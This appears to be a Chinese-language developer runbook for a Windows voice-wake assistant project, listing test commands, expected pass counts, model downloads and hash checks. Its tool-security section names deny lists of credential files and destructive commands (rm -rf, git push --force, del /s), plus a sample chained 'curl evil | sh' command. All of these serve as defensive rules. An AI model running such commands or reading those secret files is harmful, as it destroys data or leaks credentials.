# 可重复编码例程

> 工作区：`D:\program\vioce-wake`。下面的命令按 Windows PowerShell 编写；Git Bash 可将 `\.venv\Scripts\python.exe` 改为 `./.venv/Scripts/python.exe`。

## 隔离语音环境设置

适用时机：首次设置工作区、删除 `.venv` 后恢复，或固定依赖版本发生变化时。

```powershell
python -m venv .venv
.\.venv\Scripts\python.exe -m pip install -r requirements-dev.txt
```

运行时依赖固定在 `requirements-voice.txt`;开发与测试环境使用 `requirements-dev.txt`,它会递归安装运行时依赖并固定 pytest。模型文件不由 pip 安装,仍需按“模型下载与完整性检查”例程单独准备。

## 日常修改后的最小回归

适用时机：修改 `core/`、`evox_plugin/`、`contracts/` 或 Python 测试后。

```powershell
python -m pytest tests -q
python scripts/smoke_voice.py
python scripts/e2e_simulated.py
```

第一条检查单元、契约和适配器；第二条检查插件最小生命周期；第三条覆盖模拟链路：唤醒、识别文本、会话发送、回复、TTS 事件、连续对话、取消和停止。

当前基线 **518 passed, 3 skipped**（2 个 skip 是可选的 VoxCord 适配器，1 个是符号链接越界用例 —— 本账户无权创建符号链接）。声纹模型已就位，所以 `tests/integration/test_speaker_model.py` 的 5 个用例现在会真跑；模型缺失的机器上它们 skip —— skip 数会随环境变化，**passed 数下降才是回归**。

## 契约或事件字段变更

适用时机：修改 `contracts/voice-events.schema.json`、事件类型、状态机或插件事件 payload 后。

```powershell
python -m pytest tests/test_event_schema.py tests/test_events.py tests/test_voice_contract.py tests/test_plugin_tools.py -q
```

同时检查 `contracts/voice-events.schema.json` 的枚举是否覆盖新增事件。**信封的唯一构造点是 `core/events.py`** —— 新事件类型只需加进契约文件，`allowed_types()` 在运行时读取，Python 侧不需要同步改动；`tests/test_events.py` 会在两者漂移时失败。事件版本变更时，更新协议文档和兼容性测试，不要只改生产代码。

平台事件走 `contracts/agent-events.schema.json`（P2 新增），另跑一组：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_agent_event_schema.py -q
```

预期 **34 passed**。这一组还守着三件与语音契约有关的事：

- `voice-events.schema.json` **字节不变**（SHA-256 摘要钉死，575 字节 `4f60…5de5`）。这条测试变红意味着有人在原地改语音契约 —— 平台事件属于另一个文件，语音事件真要变则是**信封版本递增**，不是原地编辑。
- 两个契约的信封**逐字段同形**、两个 `type` 枚举**互斥**。同形是合流的前提，互斥是 `contract_for()` 不歧义的前提；任一变红，`validate_any_event()` 就不再可信。
- `contracts/agents.schema.json` **不许长出校验器没实现的关键字**。声明了却不生效的约束比不声明更糟，反向断言把这条钉住；`kind` 枚举与 `AGENT_KINDS` 必须相等，否则配置校验通过后会在构造适配器时才炸。

新增平台事件类型时只改契约文件，但记得同步 `test_platform_contract_declares_the_expected_surface` 里的分组断言 —— 它逐组断言而不是只断言总数，这是有意的。

## Provider 适配器变更

适用时机：修改 `core/audio/`（`base` / `kws` / `vad` / `capture` / `voxcord`）、`core/providers.py` 重导出薄壳、VoxCord 动态导入、Sherpa 模型加载或设备发现后。

```powershell
python -m pytest tests/test_provider_adapter.py tests/test_sherpa_provider.py -q
python -c "from core.providers import VoxCordAdapter; print(VoxCordAdapter().load())"
```

没有 VoxCord、Sherpa 或音频驱动时，导入仍应成功；不可用状态应返回原因，而不是在模块导入阶段崩溃。第二条命令走的是 `core/providers.py` 的重导出路径，它同时验证拆包后旧导入路径没有断。

## Sherpa 中文 KWS 验证

适用时机：更换 Sherpa 版本、ONNX 模型、关键词文件、阈值、线程数或音频分块大小后。该例程不打开麦克风，只使用随模型附带的 wav。

```powershell
.\.venv\Scripts\python.exe tmp_proto/test_kws.py `
  models/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/test_wavs/3.wav
```

预期输出包含 `audio`、`RTF`、`hits`、`silence control` 和 `resource release OK`。`RTF < 1` 才表示实时性达标；静音应为 `clean (no false trigger)`。测试音频使用模型自带的 `test_keywords.txt` 时，需要把脚本中的 `keywords_file` 切换到该文件；它不是“你好问问”的真实录音。

模型已下载时，也可以运行隔离 provider 测试：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_sherpa_provider.py -q
```

## TTS→VAD→KWS 闭环验证

适用时机：更换 TTS/KWS/VAD 模型、音频重采样逻辑、关键词文件或 Sherpa 版本后。该例程不打开麦克风，用 TTS 合成的“你好问问”回灌唤醒模型。

```powershell
.\.venv\Scripts\python.exe tmp_proto/tts_kws_vad.py
```

预期 JSON 输出中 `hit: true`、`kws_hits` 包含 `你好问问`、`vad_segments` 非空，并写出 `tmp_proto/tts_nihao.wav`。注意使用隔离 `.venv` 的 Python，因为它安装了 sherpa-onnx 和 soundfile；系统 Python 没有这些依赖。

## 本地麦克风与 VAD 冒烟

适用时机：更换电脑、音频驱动、输入设备、`sounddevice` 版本或 Silero 模型后。音频只保存在内存中，不保存、不上传。

先列出设备：

```powershell
.\.venv\Scripts\python.exe -c "import sounddevice as sd; print(sd.query_devices())"
```

再用输入设备编号运行短采集：

```powershell
.\.venv\Scripts\python.exe scripts/acceptance/smoke_microphone.py --device 1 --duration 3
```

预期结果包含 `REAL_MICROPHONE_LOCAL`、非负 RMS/peak、`audio_saved: false` 和 `resources_released: true`。安静环境中 `vad_segments` 为空是正常结果；该命令只证明设备、采集和 VAD 管线可用，不证明真实唤醒质量。

## 真实麦克风唤醒验收

适用时机：更换麦克风、唤醒词、关键词阈值或 Sherpa 版本后。用隔离 `.venv` 的 Python 运行（系统 Python 没装 sherpa-onnx / soundfile）：

```powershell
.\.venv\Scripts\python.exe scripts/acceptance/live_wake.py --duration 45 --device 1
```

运行后对着麦克风说「你好问问」。预期立即打印 `WAKE HIT: '你好问问'`，结束 JSON 中 `hit: true`、`audio_saved: false`、`resources_released: true`。可用 `--threshold` 调整灵敏度（默认 0.25），`--device` 从设备列表中选择。

## 声纹回归

适用时机：修改 `core/audio/speaker.py`、`core/audio/capture.py` 的环形缓冲或声纹门、`config/speaker.toml`、注册脚本，或调整阈值后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_speaker.py tests/test_speaker_privacy.py -q
```

预期 **30 passed**。这组测试**故意不依赖 37.8 MB 声纹模型**：要守的性质恰恰是模型缺失时必须成立的那些。逐条必须成立的是 fail-closed（失败即关闭）四条路径 —— 模型缺失、无人注册、embedding 抛异常、分数低于阈值 —— 全部落在拒绝一侧，`verify()` 对普通拒绝从不抛异常而是返回 `accepted=False`。另外两条是隐私断言：`describe()` 不含任何向量值，音频不落盘。

**任何一条 fail-closed 断言变红都不许绕过。** 一个模型缺失就静默放行的声纹门，比没有门更糟 —— 它给了一种不存在的安全感。

判别力与阈值另跑需要模型的那一组（预期 **5 passed**，模型缺失时 5 skipped）：

```powershell
.\.venv\Scripts\python.exe -m pytest tests/integration/test_speaker_model.py -q
```

它在模型自带的 7 段真实人声上断言簇内最低相似度高于簇间最高（实测 0.736 vs 0.370），默认阈值 0.5 落在这个间隙里。**这是 AUTO 不是 REAL-MIC** —— 既有录音不等于本机麦克风，本人通过率与他人拒绝率仍待 P10。其中一条是反向断言：合成音调**必须**继续互相通过，一旦它变红说明合成音频开始能测判别力了，改文档再依赖它。

改完阈值后同时看诊断：

```powershell
.\.venv\Scripts\python.exe -c "from evox_plugin import VoicePlugin; import json; print(json.dumps(VoicePlugin().diagnose()['speaker'], ensure_ascii=False, indent=2))"
```

预期只有名字与样本数，**绝不含向量**。若 `require_verification` 为 `False`，诊断必须把它报成警告。识别准确率（本人通过率、他人拒绝率、录音回放）只能 REAL-MIC 实测，AUTO 一律不背书。

## 工具权限回归

适用时机：修改 `core/tools/`（`contract` / `policy` / `fs` / `web` / `shell`）或 `config/tools.toml` 后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_tools.py tests/test_tool_security.py -q
```

每条安全门对应一个测试，一条都不许跳过：`fs.read` 沙箱越界被拒、敏感文件名（`.env` / `*.pem` / `id_rsa*` / `credentials.json` / `*secret*`）被拒、`shell.run` 默认关闭、白名单外命令**被拒而非被询问**、每个危险模式（`rm -rf` / `git push --force` / `reset --hard` / `format` / `del /s`）被硬拦截。

`voice` 与 `agent` 两个 origin 必须走同一道 `ToolPolicy.check()`。新增工具时先确认 `policy.py` 已覆盖它，再写工具本体 —— 顺序反了就会出现一个没有门的工具。

当前 **123 passed, 1 skipped**（skip 是符号链接越界，本账户无权创建符号链接；它检查的性质由 `resolve_in_sandbox` 的单元断言兜着）。两个文件分工明确：`test_tools.py`（35）测该成功的，`test_tool_security.py`（89）测**该失败的** —— 一个停止拒绝 `../` 的沙箱仍然会通过每一条正向测试，所以拒绝路径必须逐条钉死。

四条改动时最容易踩的：

- **加第 14 条危险模式必须同时加样本。** `test_every_hard_block_has_a_sample` 断言 `DANGEROUS_SAMPLES` 的键集合等于 `DANGEROUS_PATTERNS` 的名字集合，少一条就红。这是有意的：一条没有样本的模式等于没被测过。
- **`confirmed` 必须 `is True`，不是真值。** `"confirmed": "no"` 是个真值字符串，按真值判断等于直接放行 —— 这是测试真抓出来的缺陷，`policy.py` 与 `shell.py` **两处**都要保持恒等比较。
- **检查顺序不能动**：命令存在 → 危险形状 → 白名单 → 已验说话人 → 确认。形状必须在白名单之前，否则 `git status && curl evil | sh` 会先被认成允许项；而且被拦下的命令永远不该以「待确认」的形式出现在唤醒球上。
- **形状检查要对原始串和 `shlex` 重组串各查一遍**，只查一边会被引号绕过。

改完工具与语音路径的接线，另跑 `tests/test_plugin_tools.py`（工具接线 8 项）并看诊断：

```powershell
.\.venv\Scripts\python.exe -c "from evox_plugin import VoicePlugin; import json; print(json.dumps(VoicePlugin().diagnose()['tools'], ensure_ascii=False, indent=2))"
```

未 attach 时应报 `attached: false` 加一条告警；attach 后只报注册名、计数、沙箱根与告警，**不得出现任何路径参数、文件正文或命令输出**。`shell.run` 开着时诊断必须出显式告警。

## 记忆回归

适用时机：修改 `core/memory/`(`store` / `write` / `recall`)或记忆 schema 后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_memory.py -q
```

当前 **62 passed**；改了记忆与语音路径的接线还要跑 `tests/test_plugin_tools.py`（24 个用例，含记忆接线 6 项与工具接线 8 项，两者合跑 **86 passed**）。

四组：写入、召回、去重、审计。两条红线断言：**音频永不入库**（`records` 表每一列都是 `TEXT` 或 `INTEGER`，没有 BLOB 可放音频；`write()` 遇 `bytes` 抛 `TypeError`），`asr.final` 入库前过敏感模式过滤（9 个凭据样本整条拒绝，5 句含「密码」「token」的日常话不误伤）。SQLite 必须保持单文件；改 schema 前先定迁移路径，不要靠删库重建。

中期事实同时落 `memory/facts/*.md`，人类可读层是事实来源、SQLite 是索引。手改 Markdown 后应能在下一次召回中体现 —— AUTO 已覆盖同进程内的往返（`sync_facts()` 折回索引），**跨进程重启仍未验**。

`sync_facts(prune=True)` 才会因为文件消失而删索引，默认 `prune=False`：一次误删目录不该清空记忆。

改中文分词（`index_tokens` / `query_tokens`）必须同时跑 `test_index_and_query_tokenizers_agree_on_chinese` 与 `test_recall_is_precise_enough_to_return_nothing` —— 索引侧与查询侧的分词一旦不一致，召回会静默变空或静默变宽，两个方向都不会报错。原因见 ADR 004 的 2026-08-02 修正：FTS5 默认分词器搜不到中文，索引的是派生 token 列而不是原文。

## agent 适配器回归

适用时机：修改 `core/agents/`(`contract` / `cli` / `evox` / `acp` / `http` / `openclaw`)或 `config/agents.toml` 后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_agent_contract.py tests/test_agent_cli.py tests/test_agent_evox.py -q
```

预期 **59 passed**（`contract` 14 + `cli` 28 + `evox` 17）。

`test_agent_contract.py` 是红线 2 在 agent 层的落点，它**解析注解**而不是读源码文本：`AgentDescriptor` / `Task` / `AgentChunk` 的每个字段递归走到叶子类型，只许 `str` / `int` / `float` / `bool` / `frozenset` / `tuple` / `Mapping` / `None`。递归是必须的 —— 只看最外层容器会让 `frozenset[SomeSdkClient]` 通过，所以有一条反向断言专门证明这个走法真的能拦下伪 SDK 类型。`Any` 只允许出现在 `AgentChunk.arguments`（工具调用的参数，形状由工具定义、由 `core/tools/policy.py` 校验），多一处就红。契约模块的 import 也被钉住：只许 `__future__` / `dataclasses` / `typing`，这条断言走 AST 而不是子串搜索，因为模块自己的 docstring 里就写着 `subprocess` 这个词。

四条改 `cli.py` 时最容易踩的：

- **失败必须是 chunk 不是异常。** 命令不存在、非零退出、超时、取消，四条路径都以带 `error` 的终结 `done` chunk 到达。派发器要能 race 两个 agent 而不用给每个包 `try`，一个坏 agent 不许把整个回合带走。
- **恰好一个 `done`。** JSONL 流里 agent 自己报的 `done` 被折进终结 chunk 而不是直接 yield —— 「每条流恰好一个 `done`」是派发器判断回合结束的依据。
- **放弃流必须杀掉进程。** `race` 模式（P6）会中途丢弃输家，生成器的 `finally` 负责收尸；漏了它，一次输掉的竞速就留下一个野进程。
- **Windows 批处理 shim 走字符串命令行而不是 argv 列表。** npm 把 `claude` 装成 `claude.cmd`，CreateProcess 用 `cmd.exe /c` 跑它；Python 按 C 运行时规则引用参数，不按 cmd.exe 规则，所以带 `"` 或 `%` 的参数**拒绝而不是转义**（BatBadBut）。一个只对两个解析器之一有效的转义比直接说不更糟。

**mock 子进程只算 SIM。** 真实 CLI 端到端跑通一轮才是 REAL-AGENT，两者不得互相冒充。`evox.py` 包装后的行为必须与包装前的 `LocalEvoXTransport` 路径一致，`core/session_bridge.py` 的五道安全校验不得随之降级 —— `evox.py` 是**包装**不是移植，这正是包装的理由。

`evox` 适配器**不流式，也不可能流式**：桥接是一次阻塞 POST 返回完整回复，没有增量端点可读。所以首字延迟等于整轮延迟，这是端点的属性不是这里偷的懒。改动时不要给它加一个「看起来增量」的外壳 —— 那会让路由的延迟数字变成虚构。

## 派发回归

适用时机：修改 `core/dispatch/`(`dispatcher` / `router` / `aggregator` / `intent` / `breaker`)后。

```powershell
.\.venv\Scripts\python.exe -m pytest tests/test_router.py tests/test_dispatcher.py tests/test_aggregator.py tests/test_intent.py tests/test_breaker.py -q
```

期望 **159 passed**（router 30 + dispatcher 37 + aggregator 20 + intent 54 + breaker 18）。覆盖五维打分（能力/成本/延迟/成功率/负载）、熔断器开合、`single` / `race` / `fanout` 三模式、规则意图分类。双 fake agent 必须产出行为一致的回合 —— 这是红线 2 在派发层的落点。

**语音路径默认必须是 `single` 或 `race`。** 若默认变成 `fanout`，首字延迟会退化为最慢 agent 的延迟；这不是性能退步而是体感破坏，改动前先看 ADR 005。

改这一层时四条不许松的属性：

- **合并后的流恰好一个 `done`。** 派发器只凭它判断回合结束：多一个会提前结束回合，少一个会挂住。`fanout` 因此折叠每个 agent 的 `done`，而不是转发。
- **`race` 的获胜者在首个 chunk 时决定，不是完成时。** 按完成判定会让空流赢——它最先完成。带 `error` 的终结 chunk 也算「说话了」：静默切给输家会把合并流变成隐式重试，而派发器会把失败的一轮记成成功。
- **动词后面必须有边界（`intent.py` 的 `_VERB_SEP`）。** 只锚在开头不够：「运行时报错了怎么办」以「运行」开头，会把「时报错了怎么办」当命令跑。改意图规则先跑 `tests/test_intent.py` 的**反向半区**，那 14 条才是这个文件的安全属性。
- **派发器永不自动确认。** `needs_confirmation` 原样带出，绝不带 `confirmed=True` 重试。一个会自己点确认的派发器让 P4 的四层全部失效。

`task.progress` 的 payload 里是 `agents`（复数）不是 `agent`：`AgentChunk` 没有来源字段，合并后的 chunk 无法归属，报一个猜的名字比不报更糟。想报「谁答的」得先给 chunk 加来源。

## 模型下载与完整性检查

适用时机：首次设置、清理缓存后恢复、或模型文件不完整时。必须使用固定版本 URL，并在解压前确认归档完整。

```powershell
$env:HTTP_PROXY = "http://127.0.0.1:12334"
$env:HTTPS_PROXY = "http://127.0.0.1:12334"
$env:ALL_PROXY = "http://127.0.0.1:12334"

curl.exe -C - -L -o models/tts.tar.bz2 `
  https://github.com/k2-fsa/sherpa-onnx/releases/download/tts-models/vits-melo-tts-zh_en.tar.bz2
7z t models/tts.tar.bz2
7z x models/tts.tar.bz2 -omodels
```

若代理没有监听，先检查：

```powershell
Test-NetConnection 127.0.0.1 -Port 12334
```

`file ends unexpectedly` 或 `7z t` 失败表示下载不完整，不能解压或把它当成模型使用。恢复前保留部分文件，使用 `curl -C -`；如果服务器不接受续传，删除该文件后重新下载。

声纹模型是单个 `.onnx`，不需要解压（约 37 MB）：

```powershell
curl.exe -C - -L -o models/3dspeaker_speech_eres2net_base_sv_zh-cn_3dspeaker_16k.onnx `
  https://github.com/k2-fsa/sherpa-onnx/releases/download/speaker-recongition-models/3dspeaker_speech_eres2net_base_sv_zh-cn_3dspeaker_16k.onnx
```

release tag 里 `recongition` 的拼写是**官方笔误**，照抄即可，改成正确拼写会 404。下载后用 provider 自检而不是只看文件大小：

```powershell
.\.venv\Scripts\python.exe -c "from core.audio import SpeakerVerificationProvider; print(SpeakerVerificationProvider('models/3dspeaker_speech_eres2net_base_sv_zh-cn_3dspeaker_16k.onnx').load())"
```

预期 `available: True` 且 `dim` 为正整数。文件截断时 `load()` 会返回不可用及原因，**不会抛异常** —— 所以必须看返回值，不能靠「没报错」判定成功。

本机 2026-08-02 实测值,用于比对完整性:39,593,761 字节,SHA-256 `1a331345f04805badbb495c775a6ddffcdd1a732567d5ec8b3d5749e3c7a5e4b`,`dim 512`,冷加载 0.234 s。

```powershell
(Get-FileHash models/3dspeaker_speech_eres2net_base_sv_zh-cn_3dspeaker_16k.onnx -Algorithm SHA256).Hash
```

流式 ASR 模型（约 74 MB 归档，解压约 110 MB，16 kHz streaming zipformer-zh-14M）：

```powershell
curl.exe -C - -L -o models/asr.tar.bz2 `
  https://github.com/k2-fsa/sherpa-onnx/releases/download/asr-models/sherpa-onnx-streaming-zipformer-zh-14M-2023-02-23.tar.bz2
tar -xjf models/asr.tar.bz2 -C models
```

下载后用 provider 自检，看返回值而不是「没报错」：

```powershell
.\\.venv\Scripts\python.exe -c "from core.audio import SherpaStreamingAsrProvider; print(SherpaStreamingAsrProvider('models/sherpa-onnx-streaming-zipformer-zh-14M-2023-02-23').load())"
```

## 声纹录入

适用时机：首次录入本人声纹、追加样本提高通过率，或换麦克风后重录。**必须本人在场**。

```powershell
.\.venv\Scripts\python.exe scripts/enroll_speaker.py --name <你的名字>
```

按提示读 3～5 句，脚本显示每段时长并写入 embedding。`enroll` 是**追加**语义：已有向量保留、新向量附加，所以一次录得不好可以补录，不必全部重来。

注册数据落 `enrollment/voiceprints.json`，它是**生物特征**，已在 `.gitignore` 内，**永不提交**。查看注册状态只用 `describe()`，不要直接读文件：

```powershell
.\.venv\Scripts\python.exe -c "from core.audio import SpeakerVerificationProvider; import json; print(json.dumps(SpeakerVerificationProvider('models/3dspeaker_speech_eres2net_base_sv_zh-cn_3dspeaker_16k.onnx').describe(), ensure_ascii=False, indent=2))"
```

删除某人的注册：`provider.remove("<名字>")`，返回 `True` 表示删掉了、`False` 表示本来就没有。

## 桌面前端改动

适用时机：修改 `desktop/src/`、`desktop/index.html`、Vite 配置或 Tauri 前端依赖后。

```powershell
Push-Location desktop
npm run build
Pop-Location
```

该命令同时运行 TypeScript 检查和 Vite 生产构建。启动本地页面进行手工检查时：

```powershell
Push-Location desktop
npm run dev
Pop-Location
```

Vite 应使用 `http://localhost:<port>`，不要把 `127.0.0.1` 作为视觉验证入口。

## Tauri/Rust 改动

适用时机：修改 `desktop/src-tauri/`、窗口属性、透明度、always-on-top、skip-taskbar 或系统 API 后。

```powershell
Push-Location desktop/src-tauri
cargo check
cargo test        # 命中区几何与反序列化 8 项
Pop-Location
```

打包前再运行：

```powershell
Push-Location desktop
npm run tauri build
Pop-Location
```

透明窗口、DPI、多显示器和不抢焦点行为不能只靠 `cargo check` 判定，必须在 Windows 实机启动后验收。

P8 唤醒球的具体验收项（都是 REAL-WIN 级）：
- 命中区之外鼠标**穿过**窗口，球与展开面板能吃鼠标；
- 无边框窗口没有跟随球的方形灰影（`shadow(false)` 生效）；
- 按住球拖 4px 以上窗口跟手，松手后不误触点击；键盘激活（`detail=0`）的点击不受拖动标志影响；
- 展开时窗口向下长、不越出工作区下边界；球在正常展开时**不跳动**；
- `EVOX_WAKE_VISIBLE` 未设时窗口隐藏、`evox_set_visible(true)` 后可见；
- 125% / 150% / 175% 缩放下命中区与光标不漂移。

验证等级说明：`cargo check`/`cargo test` 只算 AUTO；命中表在 `docs/research/prototype-results.md` 里是 SIM；真机手感是 P10（发布阻塞项 #5）。

## EvoX 会话桥接回归

适用时机：修改 `core/session_bridge.py`、认证头、桥接 URL、turn 取消路径或响应格式后。

```powershell
python -m pytest tests/test_session_bridge.py tests/test_plugin_tools.py -q
```

桥接必须携带 bearer token；明文 HTTP 只允许 `localhost` 或 IP loopback；HTTPS 可用于远端端点；`turn_id` 会进行 URL 编码。真实 EvoX 服务尚未在本机提供可验证的测试端点，因此当前测试使用本地临时 HTTP 服务。

## 诊断与设备检查

适用时机：用户反馈“没有唤醒”“没有麦克风”“会话不回消息”时。

```powershell
python -c "from evox_plugin import VoicePlugin; import json; print(json.dumps(VoicePlugin().diagnose(), ensure_ascii=False, indent=2))"
```

诊断只输出 provider、桥接 URL 是否配置 token、音频后端可用性和设备列表，不输出 token 内容。设备枚举失败时先看 `reason`，再决定是否安装 `sounddevice` 或系统音频驱动。

## 修改前后的工作区检查

适用时机：开始一轮较大修改、准备提交或接手隔夜工作区时。

```powershell
git status --short
rg --files -g '!desktop/node_modules' -g '!.venv' | sort
rg "TODO|FIXME|release blocker|not verified" core evox_plugin desktop docs tests scripts
```

先确认已有用户修改，不要覆盖无关脏文件；再根据未验证项选择最小回归范围。

## 推荐执行顺序

- 小型 Python 修改：日常最小回归。
- 事件或状态修改：契约回归，然后日常最小回归。
- 音频/provider 修改：Provider 回归、KWS 隔离验证，然后日常最小回归。
- 声纹修改：声纹回归，然后日常最小回归；阈值改动额外看 `diagnose()`。
- 平台层修改：对应的工具/记忆/agent/派发回归，然后日常最小回归。
- 前端修改：`npm run build`；窗口属性修改再加 `cargo check` 和 Windows 实机验收。
- 模型或依赖变更：记录版本、来源、归档校验结果到 `THIRD_PARTY_NOTICES.md` 和 `docs/research/prototype-results.md`。

每个阶段收尾一律跑全量 `python -m pytest tests -q`（当前基线 **518 passed, 3 skipped**），不用单文件绿灯代替全量。
